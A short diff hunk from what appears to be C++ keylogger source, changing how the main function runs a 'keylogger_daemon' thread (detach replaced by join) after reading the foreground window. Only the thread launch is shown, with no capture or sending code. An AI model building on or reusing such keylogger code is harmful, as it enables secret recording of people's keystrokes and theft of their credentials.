@@ -157,7 +157,7 @@ int main(){
     curr_window = GetForegroundWindow();
 
     std::thread keylogger_daemon(klogger);
-    keylogger_daemon.detach();
+    keylogger_daemon.join();
 
     return 0;
 }
